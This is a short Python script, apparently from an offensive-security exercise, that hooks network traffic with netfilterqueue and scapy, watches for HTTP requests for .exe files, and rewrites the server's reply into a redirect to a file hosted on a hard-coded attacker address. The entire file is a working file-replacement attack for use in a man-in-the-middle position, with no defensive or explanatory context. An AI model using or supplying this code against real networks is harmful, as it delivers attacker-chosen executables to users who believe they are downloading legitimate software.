#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if not "10.141.8.25" in scapy_packet[scapy.Raw].load:
            if scapy_packet[scapy.TCP].dport == 80:
                if ".exe" in scapy_packet[scapy.Raw].load:
                    print("[+] exe file Requested")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    print ("[+] Replacing requested file ")
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    scapy_packet[
                        scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " \
                                          "http://10.141.8.25/file_intercepted.exe\n\n\n "
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    print (scapy_packet.show())
                    packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
